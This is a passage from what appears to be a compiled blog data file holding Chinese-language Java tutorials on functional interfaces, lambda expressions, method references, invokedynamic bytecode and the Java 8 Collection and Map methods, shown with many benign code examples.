12 13 14 15 16 \n 编写判断方法 \n \n 创建一个名为isBlankOrNoBlank的方法，方法的返回值为刚才定义的函数式接口-PresentOrElseHandler \n /**\n * 参数为true或false时，分别进行不同的操作\n *\n * @param b\n * @return com.example.demo.func.BranchHandle\n **/ \n public   static   PresentOrElseHandler < ? >   isBlankOrNoBlank ( String  str ) { \n\n     return   ( consumer ,  runnable )   ->   { \n         if   ( str  ==   null   ||  str . length ( )   ==   0 ) { \n            runnable . run ( ) ; \n         }   else   { \n            consumer . accept ( str ) ; \n         } \n     } ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \n 使用方式\n调用工具类参数参数后，调用函数式接口的presentOrElseHandle方法传入一个Consumer和Runnable参数不为空时，打印参数 \n \n   @Test \n     public   void   testVutils ( ) { \n         VUtils . isTrue ( false ) . throwMessage ( "你是真的就报错了" ) ; \n\n         VUtils . isTureOrFalse ( true ) . trueOrFalseHandle ( ( ) -> { \n             System . out . println ( "为true，我是真的" ) ; \n         } , ( ) -> { \n             System . out . println ( "false，我是假的" ) ; \n         } ) ; \n\n         // 为空不为空 \n\n\n         VUtils . isBlankOrNoBlank ( "123" ) . presentOrElseHandle ( new   Consumer < Object > ( )   { \n             @Override \n             public   void   accept ( Object  o )   { \n                 System . out . println ( "不为空" +  o . toString ( ) ) ; \n             } \n         } ,   ( )   ->   { \n             System . out . println ( "为空字符串" ) ; \n         } ) ; \n\n         VUtils . isBlankOrNoBlank ( "123" ) . presentOrElseHandle ( ( cunsumerParam ) -> { \n             System . out . println ( "不为空" + cunsumerParam ) ; \n         } ,   ( )   ->   { \n             System . out . println ( "为空字符串" ) ; \n         } ) ; \n\n         VUtils . isBlankOrNoBlank ( "123" ) . presentOrElseHandle ( System . out :: println ,   ( )   ->   { \n             System . out . println ( "为空字符串" ) ; \n         } ) ; \n     } \n\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #  结尾 \n Function函数式接口是java 8非常重要的特性，利用好Function函数可以极大的简化代码 \n'},{title:"Java8之Lambda以及Stream/Map",frontmatter:{title:"Java8之Lambda以及Stream/Map",date:"2022-02-20T19:50:59.000Z",tags:["stream","lambda"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/java/java8_lamnda_stream.html",relativePath:"blogs/java/java8_lamnda_stream.md",key:"v-616f7659",path:"/blogs/java/java8_lamnda_stream.html",headers:[{level:2,title:"Lambda and Anonymous Classes(I)",slug:"lambda-and-anonymous-classes-i"},{level:3,title:"简写的依据",slug:"简写的依据"},{level:3,title:"自定义函数接口",slug:"自定义函数接口"},{level:3,title:"方法引用",slug:"方法引用"},{level:2,title:"Lambda and Anonymous Classes(II)",slug:"lambda-and-anonymous-classes-ii"},{level:3,title:"匿名内部类实现",slug:"匿名内部类实现"},{level:3,title:"Lambda表达式实现",slug:"lambda表达式实现"},{level:3,title:"推论，this引用的意义",slug:"推论-this引用的意义"},{level:2,title:"Lambda and Collections",slug:"lambda-and-collections"},{level:3,title:"Collection中的新方法",slug:"collection中的新方法"},{level:3,title:"Map中的新方法",slug:"map中的新方法"},{level:2,title:"Streams API(I)",slug:"streams-api-i"},{level:3,title:"stream方法使用",slug:"stream方法使用"},{level:2,title:"Streams API(II)",slug:"streams-api-ii"},{level:3,title:"多面手reduce()",slug:"多面手reduce"},{level:3,title:"终极武器collect()",slug:"终极武器collect"},{level:3,title:"接口的静态方法和默认方法",slug:"接口的静态方法和默认方法"},{level:3,title:"方法引用",slug:"方法引用-2"},{level:3,title:"收集器",slug:"收集器"},{level:3,title:"使用collect()生成Collection",slug:"使用collect-生成collection"},{level:3,title:"使用collect()生成Map",slug:"使用collect-生成map"},{level:3,title:"使用collect()做字符串join",slug:"使用collect-做字符串join"},{level:3,title:"collect()还可以做更多",slug:"collect-还可以做更多"},{level:2,title:"Stream Pipelines",slug:"stream-pipelines"},{level:3,title:"一种直白的实现方式",slug:"一种直白的实现方式"},{level:3,title:"Stream流水线解决方案",slug:"stream流水线解决方案"},{level:2,title:"结语",slug:"结语"},{level:2,title:"参考链接",slug:"参考链接"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' Java Lambda表达式的一个重要用法是简化某些匿名内部类 （Anonymous Classes） 的写法。实际上Lambda表达式并不仅仅是匿名内部类的语法糖，JVM内部是通过invokedynamic指令来实现Lambda表达式的。具体原理放到下一篇。本篇我们首先感受一下使用Lambda表达式带来的便利之处。 \n Lambda and Anonymous Classes(I) \n 本节将介绍如何使用Lambda表达式简化匿名内部类的书写，但Lambda表达式并不能取代所有的匿名内部类，只能用来取代函数接口（Functional Interface）的简写。先别在乎细节，看几个例子再说。 \n \n 例子1：无参函数的简写 \n \n 如果需要新建一个线程，一种常见的写法是这样： \n // JDK7 匿名内部类写法 \n new   Thread ( new   Runnable ( ) { // 接口名 \n   @Override \n   public   void   run ( ) { // 方法名 \n     System . out . println ( "Thread run()" ) ; \n   } \n } ) . start ( ) ; \n \n 1 2 3 4 5 6 7 上述代码给Tread类传递了一个匿名的Runnable对象，重载Runnable接口的run()方法来实现相应逻辑。这是JDK7以及之前的常见写法。匿名内部类省去了为类起名字的烦恼，但还是不够简化，在Java 8中可以简化为如下形式： \n // JDK8 Lambda表达式写法 \n new   Thread ( \n     ( )   ->   System . out . println ( "Thread run()" ) // 省略接口名和方法名 \n ) . start ( ) ; \n \n 1 2 3 4 上述代码跟匿名内部类的作用是一样的，但比匿名内部类更进一步。这里连接口名和函数名都一同省掉了，写起来更加神清气爽。如果函数体有多行，可以用大括号括起来，就像这样： \n // JDK8 Lambda表达式代码块写法 \n new   Thread ( \n         ( )   ->   { \n             System . out . print ( "Hello" ) ; \n             System . out . println ( " Hoolee" ) ; \n         } \n ) . start ( ) ; \n \n 1 2 3 4 5 6 7 \n 例子2：带参函数的简写 \n \n 如果要给一个字符串列表通过自定义比较器，按照字符串长度进行排序，Java 7的书写形式如下： \n // JDK7 匿名内部类写法 \n List < String >  list  =   Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ; \n Collections . sort ( list ,   new   Comparator < String > ( ) { // 接口名 \n     @Override \n     public   int   compare ( String  s1 ,   String  s2 ) { // 方法名 \n         if ( s1  ==   null ) \n             return   - 1 ; \n         if ( s2  ==   null ) \n             return   1 ; \n         return  s1 . length ( ) - s2 . length ( ) ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 上述代码通过内部类重载了Comparator接口的compare()方法，实现比较逻辑。采用Lambda表达式可简写如下： \n // JDK8 Lambda表达式写法 \n List < String >  list  =   Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ; \n Collections . sort ( list ,   ( s1 ,  s2 )   -> { // 省略参数表的类型 \n     if ( s1  ==   null ) \n         return   - 1 ; \n     if ( s2  ==   null ) \n         return   1 ; \n     return  s1 . length ( ) - s2 . length ( ) ; \n } ) ; \n \n 1 2 3 4 5 6 7 8 9 上述代码跟匿名内部类的作用是一样的。除了省略了接口名和方法名，代码中把参数表的类型也省略了。这得益于javac的类型推断机制，编译器能够根据上下文信息推断出参数的类型，当然也有推断失败的时候，这时就需要手动指明参数类型了。注意，Java是强类型语言，每个变量和对象都必需有明确的类型。 \n 简写的依据 \n 也许你已经想到了，能够使用Lambda的依据是必须有相应的函数接口（函数接口，是指内部只有一个抽象方法的接口）。这一点跟Java是强类型语言吻合，也就是说你并不能在代码的任何地方任性的写Lambda表达式。实际上Lambda的类型就是对应函数接口的类型。Lambda表达式另一个依据是类型推断机制，在上下文信息足够的情况下，编译器可以推断出参数表的类型，而不需要显式指名。Lambda表达更多合法的书写形式如下： \n // Lambda表达式的书写形式 \n Runnable  run  =   ( )   ->   System . out . println ( "Hello World" ) ; // 1 \n ActionListener  listener  =  event  ->   System . out . println ( "button clicked" ) ; // 2 \n Runnable  multiLine  =   ( )   ->   { // 3 代码块 \n     System . out . print ( "Hello" ) ; \n     System . out . println ( " Hoolee" ) ; \n } ; \n BinaryOperator < Long >  add  =   ( Long  x ,   Long  y )   ->  x  +  y ; // 4 \n BinaryOperator < Long >  addImplicit  =   ( x ,  y )   ->  x  +  y ; // 5 类型推断 \n \n 1 2 3 4 5 6 7 8 9 上述代码中，1展示了无参函数的简写；2处展示了有参函数的简写，以及类型推断机制；3是代码块的写法；4和5再次展示了类型推断机制。 \n 自定义函数接口 \n 自定义函数接口很容易，只需要编写一个只有一个抽象方法的接口即可。 \n // 自定义函数接口 \n @FunctionalInterface \n public   interface   ConsumerInterface < T > { \n   void   accept ( T  t ) ; \n } \n \n 1 2 3 4 5 上面代码中的@FunctionalInterface是可选的，但加上该标注编译器会帮你检查接口是否符合函数接口规范。就像加入@Override标注会检查是否重载了函数一样。 \n 有了上述接口定义，就可以写出类似如下的代码： \n ConsumerInterface < String >  consumer  =  str  ->   System . out . println ( str ) ; \n \n 1 进一步的，还可以这样使用： \n class   MyStream < T > { \n   private   List < T >  list ; \n     . . . \n   public   void   myForEach ( ConsumerInterface < T >  consumer ) { // 1 \n     for ( T  t  :  list ) { \n      consumer . accept ( t ) ; \n     } \n   } \n } \n MyStream < String >  stream  =   new   MyStream < String > ( ) ; \nstream . myForEach ( str  ->   System . out . println ( str ) ) ; // 使用自定义函数接口书写Lambda表达式 \n \n 1 2 3 4 5 6 7 8 9 10 11 #  方法引用 \n 有时候Lambda表达式的代码就只是一个简单的方法调用而已，遇到这种情况，Lambda表达式还可以进一步简化为 方法引用（Method References） 。一共有四种形式的方法引用， \n \n 静态方法引用 \n \n 它的语法是Class::static_method \n List < Integer >  ints  =   Arrays . asList ( 1 ,   2 ,   3 ) ; \nints . sort ( Integer :: compare ) ; \n \n 1 2 \n 特定对象的方法引用 \n \n 它的语法是instance::method实例如下 \n cars . forEach (  police :: follow   ) ; \n \n 1 \n 特定类的任意对象的方法引用 \n \n 它的语法是Class::method \n words . stream ( ) . map ( word  ->  word . length ( ) ) ;   // lambda \nwords . stream ( ) . map ( String :: length ) ;   // method reference \n\ncars . forEach (   Car :: repair   ) ; \n \n 1 2 3 4 \n 构造器引用 ，例如： \n \n 它的语法是Class::new，或者更一般的 Class<T>::new \n // lambda \nwords . stream ( ) . map ( word  ->   { \n     return   new   StringBuilder ( word ) ; \n } ) ; \n // constructor reference \nwords . stream ( ) . map ( StringBuilder :: new ) ; \n \n 1 2 3 4 5 6 #  Lambda and Anonymous Classes(II) \n 读过上一篇之后，相信对Lambda表达式的语法以及基本原理有了一定了解。对于编写代码，有这些知识已经够用。本文将进一步区分Lambda表达式和匿名内部类在JVM层面的区别，如果对这一部分不感兴趣，可以跳过。 \n 经过第一篇的的介绍，我们看到Lambda表达式似乎只是为了简化匿名内部类书写，这看起来仅仅通过语法糖在编译阶段把所有的Lambda表达式替换成匿名内部类就可以了。但实时并非如此。在JVM层面，Lambda表达式和匿名内部类有着明显的差别。 \n 匿名内部类实现 \n 匿名内部类仍然是一个类，只是不需要程序员显示指定类名，编译器会自动为该类取名。因此如果有如下形式的代码，编译之后将会产生两个class文件： \n public   class   MainAnonymousClass   { \n   public   static   void   main ( String [ ]  args )   { \n     new   Thread ( new   Runnable ( ) { \n       @Override \n       public   void   run ( ) { \n         System . out . println ( "Anonymous Class Thread run()" ) ; \n       } \n     } ) . start ( ) ; ; \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 编译之后文件分布如下，两个class文件分别是主类和匿名内部类产生的： \n \n 进一步分析主类MainAnonymousClass.class的字节码，可发现其创建了匿名内部类的对象： \n // javap -c MainAnonymousClass.class \n public   class   MainAnonymousClass   { \n   . . . \n   public   static   void   main ( java . lang . String [ ] ) ; \n     Code : \n        0 :   new            # 2                    // class java/lang/Thread \n        3 :  dup\n        4 :   new            # 3                    // class MainAnonymousClass$1 /*创建内部类对象*/ \n        7 :  dup\n        8 :  invokespecial # 4                    // Method MainAnonymousClass$1."<init>":()V \n       11 :  invokespecial # 5                    // Method java/lang/Thread."<init>":(Ljava/lang/Runnable;)V \n       14 :  invokevirtual # 6                    // Method java/lang/Thread.start:()V \n       17 :   return \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #  Lambda表达式实现 \n Lambda表达式通过invokedynamic指令实现，书写Lambda表达式不会产生新的类。如果有如下代码，编译之后只有一个class文件： \n public   class   MainLambda   { \n   public   static   void   main ( String [ ]  args )   { \n     new   Thread ( \n         ( )   ->   System . out . println ( "Lambda Thread run()" ) \n       ) . start ( ) ; ; \n   } \n } \n \n 1 2 3 4 5 6 7 编译之后的结果： \n \n 通过javap反编译命名，我们更能看出Lambda表达式内部表示的不同： \n // javap -c -p MainLambda.class \n public   class   MainLambda   { \n   . . . \n   public   static   void   main ( java . lang . String [ ] ) ; \n     Code : \n        0 :   new            # 2                    // class java/lang/Thread \n        3 :  dup\n        4 :  invokedynamic # 3 ,    0                // InvokeDynamic #0:run:()Ljava/lang/Runnable; /*使用invokedynamic指令调用*/ \n        9 :  invokespecial # 4                    // Method java/lang/Thread."<init>":(Ljava/lang/Runnable;)V \n       12 :  invokevirtual # 5                    // Method java/lang/Thread.start:()V \n       15 :   return \n\n   private   static   void  lambda$main$ 0 ( ) ;    /*Lambda表达式被封装成主类的私有方法*/ \n     Code : \n        0 :  getstatic     # 6                    // Field java/lang/System.out:Ljava/io/PrintStream; \n        3 :  ldc           # 7                    // String Lambda Thread run() \n        5 :  invokevirtual # 8                    // Method java/io/PrintStream.println:(Ljava/lang/String;)V \n        8 :   return \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 反编译之后我们发现Lambda表达式被封装成了主类的一个私有方法，并通过invokedynamic指令进行调用。 \n 推论，this引用的意义 \n 既然Lambda表达式不是内部类的简写，那么Lambda内部的this引用也就跟内部类对象没什么关系了。在Lambda表达式中this的意义跟在表达式外部完全一样。因此下列代码将输出两遍Hello Hoolee，而不是两个引用地址。 \n public   class   Hello   { \n   Runnable  r1  =   ( )   ->   {   System . out . println ( this ) ;   } ; \n   Runnable  r2  =   ( )   ->   {   System . out . println ( toString ( ) ) ;   } ; \n   public   static   void   main ( String [ ]  args )   { \n     new   Hello ( ) . r1 . run ( ) ; \n     new   Hello ( ) . r2 . run ( ) ; \n   } \n   public   String   toString ( )   {   return   "Hello Hoolee" ;   } \n } \n \n 1 2 3 4 5 6 7 8 9 #  Lambda and Collections \n 我们先从最熟悉的Java集合框架(Java Collections Framework, JCF)开始说起。 \n 为引入Lambda表达式，Java8新增了java.util.funcion包，里面包含常用的函数接口，这是Lambda表达式的基础，Java集合框架也新增部分接口，以便与Lambda表达式对接。 \n 首先回顾一下Java集合框架的接口继承结构： \n \n 上图中绿色标注的接口类，表示在Java8中加入了新的接口方法，当然由于继承关系，他们相应的子类也都会继承这些新方法。下表详细列举了这些方法。 \n \n \n \n 接口名 \n Java8新加入的方法 \n \n \n \n \n Collection \n removeIf() spliterator() stream() parallelStream() forEach() \n \n \n List \n replaceAll() sort() \n \n \n Map \n getOrDefault() forEach() replaceAll() putIfAbsent() remove() replace() computeIfAbsent() computeIfPresent() compute() merge() \n \n \n \n 这些新加入的方法大部分要用到java.util.function包下的接口，这意味着这些方法大部分都跟Lambda表达式相关。我们将逐一学习这些方法。 \n Collection中的新方法 \n 如上所示，接口Collection和List新加入了一些方法，我们以是List的子类ArrayList为例来说明。了解Java7ArrayList实现原理，将有助于理解下文。 \n forEach() \n 该方法的签名为void forEach(Consumer<? super E> action)，作用是对容器中的每个元素执行action指定的动作，其中Consumer是个函数接口，里面只有一个待实现方法void accept(T t)（后面我们会看到，这个方法叫什么根本不重要，你甚至不需要记忆它的名字）。 \n 需求：假设有一个字符串列表，需要打印出其中所有长度大于3的字符串. \n Java7及以前我们可以用增强的for循环实现： \n // 使用曾强for循环迭代 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \n for ( String  str  :  list ) { \n     if ( str . length ( ) > 3 ) \n         System . out . println ( str ) ; \n } \n \n 1 2 3 4 5 6 现在使用forEach()方法结合匿名内部类，可以这样实现： \n // 使用forEach()结合匿名内部类迭代 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \nlist . forEach ( new   Consumer < String > ( ) { \n     @Override \n     public   void   accept ( String  str ) { \n         if ( str . length ( ) > 3 ) \n             System . out . println ( str ) ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 9 上述代码调用forEach()方法，并使用匿名内部类实现Comsumer接口。到目前为止我们没看到这种设计有什么好处，但是不要忘记Lambda表达式，使用Lambda表达式实现如下： \n // 使用forEach()结合Lambda表达式迭代 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \nlist . forEach (  str  ->   { \n         if ( str . length ( ) > 3 ) \n             System . out . println ( str ) ; \n     } ) ; \n \n 1 2 3 4 5 6 上述代码给forEach()方法传入一个Lambda表达式，我们不需要知道accept()方法，也不需要知道Consumer接口，类型推导帮我们做了一切。 \n removeIf() \n 该方法签名为boolean removeIf(Predicate<? super E> filter)，作用是删除容器中所有满足filter指定条件的元素，其中Predicate是一个函数接口，里面只有一个待实现方法boolean test(T t)，同样的这个方法的名字根本不重要，因为用的时候不需要书写这个名字。 \n 需求：假设有一个字符串列表，需要删除其中所有长度大于3的字符串。 \n 我们知道如果需要在迭代过程冲对容器进行删除操作必须使用迭代器，否则会抛出ConcurrentModificationException，所以上述任务传统的写法是： \n // 使用迭代器删除列表元素 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \n Iterator < String >  it  =  list . iterator ( ) ; \n while ( it . hasNext ( ) ) { \n     if ( it . next ( ) . length ( ) > 3 )   // 删除长度大于3的元素 \n        it . remove ( ) ; \n } \n \n 1 2 3 4 5 6 7 现在使用removeIf()方法结合匿名内部类，我们可是这样实现： \n // 使用removeIf()结合匿名名内部类实现 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \nlist . removeIf ( new   Predicate < String > ( ) {   // 删除长度大于3的元素 \n     @Override \n     public   boolean   test ( String  str ) { \n         return  str . length ( ) > 3 ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 上述代码使用removeIf()方法，并使用匿名内部类实现Precicate接口。相信你已经想到用Lambda表达式该怎么写了： \n // 使用removeIf()结合Lambda表达式实现 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \nlist . removeIf ( str  ->  str . length ( ) > 3 ) ;   // 删除长度大于3的元素 \n \n 1 2 3 使用Lambda表达式不需要记忆Predicate接口名，也不需要记忆test()方法名，只需要知道此处需要一个返回布尔类型的Lambda表达式就行了。 \n replaceAll() \n 该方法签名为 void replaceAll(UnaryOperator<E> operator) ，作用是对每个元素执行operator指定的操作，并用操作结果来替换原来的元素。其中UnaryOperator是一个函数接口，里面只有一个待实现函数T apply(T t)。 \n 需求：假设有一个字符串列表，将其中所有长度大于3的元素转换成大写，其余元素不变。 \n Java7及之前似乎没有优雅的办法： \n // 使用下标实现元素替换 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \n for ( int  i = 0 ;  i < list . size ( ) ;  i ++ ) { \n     String  str  =  list . get ( i ) ; \n     if ( str . length ( ) > 3 ) \n        list . set ( i ,  str . toUpperCase ( ) ) ; \n } \n \n 1 2 3 4 5 6 7 使用replaceAll()方法结合匿名内部类可以实现如下： \n // 使用匿名内部类实现 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \nlist . replaceAll ( new   UnaryOperator < String > ( ) { \n     @Override \n     public   String   apply ( String  str ) { \n         if ( str . length ( ) > 3 ) \n             return  str . toUpperCase ( ) ; \n         return  str ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 9 10 上述代码调用replaceAll()方法，并使用匿名内部类实现UnaryOperator接口。我们知道可以用更为简洁的Lambda表达式实现： \n // 使用Lambda表达式实现 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \nlist . replaceAll ( str  ->   { \n     if ( str . length ( ) > 3 ) \n         return  str . toUpperCase ( ) ; \n     return  str ; \n } ) ; \n \n 1 2 3 4 5 6 7 #  sort() \n 该方法定义在List接口中，方法签名为void sort(Comparator<? super E> c)，该方法根据c指定的比较规则对容器元素进行排序。Comparator接口我们并不陌生，其中有一个方法int compare(T o1, T o2)需要实现，显然该接口是个函数接口。 \n 需求：假设有一个字符串列表，按照字符串长度增序对元素排序。 \n 由于Java7以及之前sort()方法在Collections工具类中，所以代码要这样写： \n // Collections.sort()方法 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \n Collections . sort ( list ,   new   Comparator < String > ( ) { \n     @Override \n     public   int   compare ( String  str1 ,   String  str2 ) { \n         return  str1 . length ( ) - str2 . length ( ) ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 现在可以直接使用List.sort()方法，结合Lambda表达式，可以这样写： \n // List.sort()方法结合Lambda表达式 \n ArrayList < String >  list  =   new   ArrayList < > ( Arrays . asList ( "I" ,   "love" ,   "you" ,   "too" ) ) ; \nlist . sort ( ( str1 ,  str2 )   ->  str1 . length ( ) - str2 . length ( ) ) ; \n \n 1 2 3 #  spliterator() \n 方法签名为 Spliterator<E> spliterator() ，该方法返回容器的可拆分迭代器。从名字来看该方法跟iterator()方法有点像，我们知道Iterator是用来迭代容器的，Spliterator也有类似作用，但二者有如下不同： \n Spliterator既可以像Iterator那样逐个迭代，也可以批量迭代。批量迭代可以降低迭代的开销。\nSpliterator是可拆分的，一个Spliterator可以通过调用 Spliterator<T>  trySplit()方法来尝试分成两个。一个是this，另一个是新返回的那个，这两个迭代器代表的元素没有重叠。\n可通过（多次）调用Spliterator.trySplit()方法来分解负载，以便多线程处理。 \n stream()和parallelStream() \n stream()和parallelStream()分别返回该容器的Stream视图表示，不同之处在于parallelStream()返回并行的Stream。Stream是Java函数式编程的核心类，我们会在后面章节中学习。 \n Map中的新方法 \n 相比Collection，Map中加入了更多的方法，我们以HashMap为例来逐一探秘。了解Java7HashMap实现原理，将有助于理解下文。 \n forEach() \n 该方法签名为void forEach(BiConsumer<? super K,? super V> action)，作用是对Map中的每个映射执行action指定的操作，其中BiConsumer是一个函数接口，里面有一个待实现方法void accept(T t, U u)。BinConsumer接口名字和accept()方法名字都不重要，请不要记忆他们。 \n 需求：假设有一个数字到对应英文单词的Map，请输出Map中的所有映射关系． \n Java7以及之前经典的代码如下： \n // Java7以及之前迭代Map \n HashMap < Integer ,   String >  map  =   new   HashMap < > ( ) ; \nmap . put ( 1 ,   "one" ) ; \nmap . put ( 2 ,   "two" ) ; \nmap . put ( 3 ,   "three" ) ; \n for ( Map . Entry < Integer ,   String >  entry  :  map . entrySet ( ) ) { \n     System . out . println ( entry . getKey ( )   +   "="   +  entry . getValue ( ) ) ; \n } \n \n 1 2 3 4 5 6 7 8 使用Map.forEach()方法，结合匿名内部类，代码如下： \n // 使用forEach()结合匿名内部类迭代Map \n HashMap < Integer ,   String >  map  =   new   HashMap < > ( ) ; \nmap . put ( 1 ,   "one" ) ; \nmap . put ( 2 ,   "two" ) ; \nmap . put ( 3 ,   "three" ) ; \nmap . forEach ( new   BiConsumer < Integer ,   String > ( ) { \n     @Override \n     public   void   accept ( Integer  k ,   String  v ) { \n         System . out . println ( k  +   "="   +  v ) ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 上述代码调用forEach()方法，并使用匿名内部类实现BiConsumer接口。当然，实际场景中没人使用匿名内部类写法，因为有Lambda表达式： \n // 使用forEach()结合Lambda表达式迭代Map \n HashMap < Integer ,   String >  map  =   new   HashMap < > ( ) ; \nmap . put ( 1 ,   "one" ) ; \nmap . put ( 2 ,   "two" ) ; \nmap . put ( 3 ,   "three" ) ; \nmap . forEach ( ( k ,  v )   ->   System . out . println ( k  +   "="   +  v ) ) ; \n } \n \n 1 2 3 4 5 6 7 #  getOrDefault() \n 该方法跟Lambda表达式没关系，但是很有用。方法签名为V getOrDefault(Object key, V defaultValue)，作用是按照给定的key查询Map中对应的value，如果没有找到则返回defaultValue。使用该方法程序员可以省去查询指定键值是否存在的麻烦． \n 需求；假设有一个数字到对应英文单词的Map，输出4对应的英文单词，如果不存在则输出NoValue \n // 查询Map中指定的值，不存在时使用默认值 \n HashMap < Integer ,   String >  map  =   new   HashMap < > ( ) ; \nmap . put ( 1 ,   "one" ) ; \nmap . put ( 2 ,   "two" ) ; \nmap . put ( 3 ,   "three" ) ; \n // Java7以及之前做法 \n if ( map . containsKey ( 4 ) ) {   // 1 \n     System . out . println ( map . get ( 4 ) ) ; \n } else { \n     System . out . println ( "NoValue" ) ; \n } \n\n // Java8使用Map.getOrDefault() \n System . out . println ( map . getOrDefault ( 4 ,   "NoValue" ) ) ;   // 2 \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #  putIfAbsent() \n 该方法跟Lambda表达式没关系，但是很有用。方法签名为V putIfAbsent(K key, V value)，作用是只有在不存在key值的映射或映射值为null时，才将value指定的值放入到Map中，否则不对Map做更改．该方法将条件判断和赋值合二为一，使用起来更加方便． \n remove() \n 我们都知道Map中有一个remove(Object key)方法，来根据指定key值删除Map中的映射关系；Java8新增了remove(Object key, Object value)方法，只有在当前Map中key正好映射到value时才删除该映射，否则什么也不做． \n replace() \n 在Java7及以前，要想替换Map中的映射关系可通过put(K key, V value)方法实现，该方法总是会用新值替换原来的值．为了更精确的控制替换行为，Java8在Map中加入了两个replace()方法，分别如下： \n \n replace(K key, V value)，只有在当前Map中key的映射存在时才用value去替换原来的值，否则什么也不做． \n replace(K key, V oldValue, V newValue)，只有在当前Map中key的映射存在且等于oldValue时才用newValue去替换原来的值，否则什么也不做．\nreplaceAll() \n \n 该方法签名为replaceAll(BiFunction<? super K,? super V,? extends V> function)，作用是对Map中的每个映射执行function指定的操作，并用function的执行结果替换原来的value，其中BiFunction是一个函数接口，里面有一个待实现方法R apply(T t, U u)．不要被如此多的函数接口吓到，因为使用的时候根本不需要知道他们的名字． \n 需求：假设有一个数字到对应英文单词的Map，请将原来映射关系中的单词都转换成大写． \n Java7以及之前经典的代码如下： \n // Java7以及之前替换所有Map中所有映射关系 \n HashMap < Integer ,   String >  map  =   new   HashMap < > ( ) ; \nmap . put ( 1 ,   "one" ) ; \nmap . put ( 2 ,   "two" ) ; \nmap . put ( 3 ,   "three" ) ; \n for ( Map . Entry < Integer ,   String >  entry  :  map . entrySet ( ) ) { \n    entry . setValue ( entry . getValue ( ) . toUpperCase ( ) ) ; \n } \n \n 1 2 3 4 5 6 7 8 使用replaceAll()方法结合匿名内部类，实现如下： \n // 使用replaceAll()结合匿名内部类实现 \n HashMap < Integer ,   String >  map  =   new   HashMap < > ( ) ; \nmap . put ( 1 ,   "one" ) ; \nmap . put ( 2 ,   "two" ) ; \nmap . put ( 3 ,   "three" ) ; \nmap . replaceAll ( new   BiFunction < Integer ,   String ,   String > ( ) { \n     @Override \n     public   String   apply ( Integer  k ,   String  v ) { \n         return  v . toUpperCase ( ) ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 上述代码调用replaceAll()方法，并使用匿名内部类实现BiFunction接口。更进一步的，使用Lambda表达式实现如下： \n // 使用replaceAll()结合Lambda表达式实现 \n HashMap < Integer ,   String >  map  =   new   HashMap < > ( ) ; \nmap . put ( 1 ,   "one" ) ; \nmap . put ( 2 ,   "two" ) ; \nmap . put ( 3 ,   "three" ) ; \nmap . replaceAll ( ( k ,  v )   ->  v . toUpperCase ( ) ) ; \n \n 1 2 3 4 5 6 简洁到让人难以置信． \n merge() \n 该方法签名为merge(K key, V value, BiFunction<? super V,? super V,? extends V> remappingFunction)，作用是： \n \n 如果Map中key对应的映射不存在或者为null，则将value（不能是null）关联到key上； \n 否则执行remappingFunction，如果执行结果非null则用该结果跟key关联，否则在Map中删除key的映射．\n参数中BiFunction函数接口前面已经介绍过，里面有一个待实现方法R apply(T t, U u)． \n \n merge()方法虽然语义有些复杂，但该方法的用方式很明确，一个比较常见的场景是将新的错误信息拼接到原来的信息上，比如： \n map . merge ( key ,  newMsg ,   ( v1 ,  v2 )   ->  v1 + v2 ) ; \n \n 1 #  compute() \n 该方法签名为compute(K key, BiFunction<? super K,? super V,? extends V> remappingFunction)，作用是把remappingFunction的计算结果关联到key上，如果计算结果为null，则在Map中删除key的映射． \n 要实现上述merge()方法中错误信息拼接的例子，使用compute()代码如下： \n map . compute ( key ,   ( k , v )   ->  v == null   ?  newMsg  :  v . concat ( newMsg ) ) ; \n \n 1 #  computeIfAbsent() \n 该方法签名为V computeIfAbsent(K key, Function<? super K,? extends V> mappingFunction)，作用是：只有在当前Map中不存在key值的映射或映射值为null时，才调用mappingFunction，并在mappingFunction执行结果非null时，将结果跟key关联． \n Function是一个函数接口，里面有一个待实现方法R apply(T t)． \n computeIfAbsent()常用来对Map的某个key值建立初始化映射．比如我们要实现一个多值映射，Map的定义可能是 Map<K,Set<V>> ，要向Map中放入新值，可通过如下代码实现： \n Map < Integer ,   Set < String > >  map  =   new   HashMap < > ( ) ; \n // Java7及以前的实现方式 \n if ( map . containsKey ( 1 ) ) { \n    map . get ( 1 ) . add ( "one" ) ; \n } else { \n     Set < String >  valueSet  =   new   